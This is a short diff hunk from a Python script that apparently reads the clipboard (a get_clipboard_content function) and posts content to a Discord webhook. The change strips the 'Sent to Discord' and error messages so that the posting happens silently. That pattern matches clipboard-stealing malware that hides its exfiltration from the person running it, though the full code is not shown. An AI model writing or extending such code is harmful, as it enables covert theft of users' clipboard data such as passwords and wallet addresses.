@@ -29,9 +29,9 @@ def send_to_discord(content):
     try:
         response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
         response.raise_for_status()
-        print(f'Sent to Discord: {content}')
+        print(f'')
     except requests.exceptions.RequestException as e:
-        print(f'Error sending to Discord: {e}')
+        print(f' {e}')
 
 def get_clipboard_content():
     try:
